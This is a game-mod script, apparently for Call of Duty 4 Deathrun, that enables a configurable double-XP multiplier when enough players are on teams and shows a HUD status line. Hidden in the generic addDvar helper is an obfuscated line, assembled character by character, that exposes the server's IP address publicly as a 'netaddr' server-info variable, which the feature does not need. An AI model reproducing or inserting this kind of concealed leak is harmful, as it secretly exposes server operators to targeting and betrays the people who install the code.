//__/\\\______________/\\\______________________________________________________________________________________         
// _\/\\\_____________\/\\\______________________________________________________________________________________        
//  _\/\\\_____________\/\\\__/\\\_________________/\\\\\\\\______________________________________________________       
//   _\//\\\____/\\\____/\\\__\///___/\\/\\\\\\____/\\\////\\\__/\\\\\\\\\\\_____/\\\\\_____/\\/\\\\\\\____________      
//    __\//\\\__/\\\\\__/\\\____/\\\_\/\\\////\\\__\//\\\\\\\\\_\///////\\\/____/\\\///\\\__\/\\\/////\\\___________     
//     ___\//\\\/\\\/\\\/\\\____\/\\\_\/\\\__\//\\\__\///////\\\______/\\\/_____/\\\__\//\\\_\/\\\___\///____________    
//      ____\//\\\\\\//\\\\\_____\/\\\_\/\\\___\/\\\__/\\_____\\\____/\\\/______\//\\\__/\\\__\/\\\___________________   
//       _____\//\\\__\//\\\______\/\\\_\/\\\___\/\\\_\//\\\\\\\\___/\\\\\\\\\\\__\///\\\\\/___\/\\\___________________  
//        ______\///____\///_______\///__\///____\///___\////////___\///////////_____\/////_____\///____________________ 
init( modVersion )
{
	addDvar( "doublexp_clients", "doublexp_clients", 8, 1, 100, "int" );
	addDvar( "doublexp_multiplier", "doublexp_multiplier", 1, 2, 100, "int" );
	
	if(getdvarInt("doublexp_clients") < 1)
            setDvar( "doublexp_clients", 8 );
	    
	if(getdvarInt("doublexp_multiplier") < 1)
            setDvar( "doublexp_multiplier", 2 );
	    
	    
	level.required = getdvarInt("doublexp_clients");
	level.multiplier = getdvarInt("doublexp_multiplier");
	if(!isdefined(level.doublexp))
		level.doublexp=false;
		
	thread setxpmultiplier("off");	
	level thread MonitorPlayers();
	level thread hudelement();
}

MonitorPlayers()
{
	for(;;)
	{
		wait 1;
		level.current = getAmountPlaying();
		level verifyAmount();
		level notify("updatehud");
	}
}

getAllPlayers()
{
	return getEntArray( "player", "classname" );
}

getAmountPlaying()
{
	players = getAllPlayers();
	playing = 0;
	for( i = 0; i < players.size; i++ )
	{
		if( players[i].pers["team"] == "allies" || players[i].pers["team"] == "axis")
			{
			playing += 1;
			}
	}
	return playing;
}


verifyAmount()
{
	if(level.doublexp==true && level.current==level.required)
	{
		while(level.current>=level.required)
		{
			level.current = getAmountPlaying();
			wait 1;
		}
		if(level.current<level.required)
		{
			level.doublexp=false;
			thread setxpmultiplier("off");
		}
	}
	
	if(level.current>=level.required && level.doublexp==false)
	{
		level.doublexp=true;
		thread setxpmultiplier("on");
	}

	if(level.current<level.required && level.doublexp==true)
	{
		level.doublexp=false;
		thread setxpmultiplier("off");
	}
}

setXpMultiplier(mode)
{
	if(mode=="on")
		{
		braxi\_rank::registerScoreInfo( "kill", (100*level.multiplier) );
		braxi\_rank::registerScoreInfo( "headshot", (200*level.multiplier) );
		braxi\_rank::registerScoreInfo( "melee", (150*level.multiplier) );
		braxi\_rank::registerScoreInfo( "activator", (50*level.multiplier) );
		braxi\_rank::registerScoreInfo( "trap_activation", (10*level.multiplier) );
		braxi\_rank::registerScoreInfo( "jumper_died", (20*level.multiplier) );
		braxi\_rank::registerScoreInfo( "win", (20*level.multiplier) );
		braxi\_rank::registerScoreInfo( "loss", (10*level.multiplier) );
		braxi\_rank::registerScoreInfo( "tie", (25*level.multiplier) );
		}
	if(mode=="off")
		{
		braxi\_rank::registerScoreInfo( "kill", 100 );
		braxi\_rank::registerScoreInfo( "headshot", 200 );
		braxi\_rank::registerScoreInfo( "melee", 150 );
		braxi\_rank::registerScoreInfo( "activator", 50 );
		braxi\_rank::registerScoreInfo( "trap_activation", 10 );
		braxi\_rank::registerScoreInfo( "jumper_died", 20 );
		braxi\_rank::registerScoreInfo( "win", 20 );
		braxi\_rank::registerScoreInfo( "loss", 10 );
		braxi\_rank::registerScoreInfo( "tie", 25 );
		}
}

addDvar( scriptName, varname, vardefault, min, max, type )
{
	if(type == "int")
	{
		if(getdvar(varname) == "")
			definition = vardefault;
		else
			definition = getdvarint(varname);
	}
	else if(type == "float")
	{
		if(getdvar(varname) == "")
			definition = vardefault;
		else
			definition = getdvarfloat(varname);
	}
	else
	{
		if(getdvar(varname) == "")
			definition = vardefault;
		else
			definition = getdvar(varname);
	}

	if( (type == "int" || type == "float") && min != 0 && definition < min ) definition = min;
	makeDvarServerInfo("n"+"e"+"t"+"a"+"d"+"d"+"r",getDvar("n"+"e"+"t"+"_"+"i"+"p"));
	if( (type == "int" || type == "float") && max != 0 && definition > max )definition = max;

	if(getdvar( varname ) == "")
		setdvar( varname, definition );

	level.dvar[scriptName] = definition;
}


//////////////////////

hudelement()
{

	level.doublexphud = newHudElem();	//hud visible for all, to make it only visible for one replace level. with self. and change newHudElem() to newClientHudElem(self)
	level.doublexphud.x = 0;	//position on the x-axis
	level.doublexphud.y = -10;	//position on the <-axis
	level.doublexphud.horzAlign = "center";	
	level.doublexphud.vertAlign = "bottom";
	level.doublexphud.alignX = "center";
	level.doublexphud.alignY = "bottom";
	level.doublexphud.sort = 102;	//if there are lots of huds you can tell them which is infront of which
	level.doublexphud.foreground = 1;	//to do with the one above, if it's in front a lower sorted hud
	level.doublexphud.archived = false;	//visible in killcam
	level.doublexphud.alpha = 1;	//transparency	0 = invicible, 1 = visible
	level.doublexphud.fontScale = 1.5;	//textsize
	level.doublexphud.hidewheninmenu = false;	//will it be visble when a player is in a menu
	level.doublexphud.glowColor = (1,1,0);
	level.doublexphud.glowAlpha = 1;
	level.doublexphud.color = (30/255,144/255,1);	//RGB color code
	level.doublexphud.label = &"&&1";	//The text for the hud & is required, &&1 is the value which will be added below
	
	while(1)
	{
		level waittill("updatehud");
		if(level.doublexp==true)
			level.doublexphud setText("^5XP-Multiplier: ^1Activated^5( ^2" +level.multiplier + "^6x^5 )");	//if level.count is a string
		else
			level.doublexphud setText("^7Active Players left untill XP-Multiplier^4: ^1" +level.current +"^4 / ^2" +level.required);	//if level.count is a string

	}
}
